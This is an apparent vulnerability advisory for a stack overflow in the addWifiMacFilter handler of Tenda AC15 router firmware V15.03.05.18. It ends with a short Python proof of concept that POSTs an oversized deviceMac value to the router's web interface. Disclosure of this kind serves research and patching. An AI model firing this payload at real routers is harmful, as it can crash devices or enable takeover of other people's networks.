## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware has a stack overflow vulnerability in the `addWifiMacFilter` function. The `v11` variable receives the `deviceMac` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v11` can trigger this security vulnerability.

![image-20240306165547354](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165547354.png)

![image-20240314212322630](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314212322630.png)

![image-20240306165606917](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306165606917.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addWifiMacFilter"
payload = b"a"*1000

data = {"deviceMac": payload, "deviceId":1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314212645798](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314212645798.png)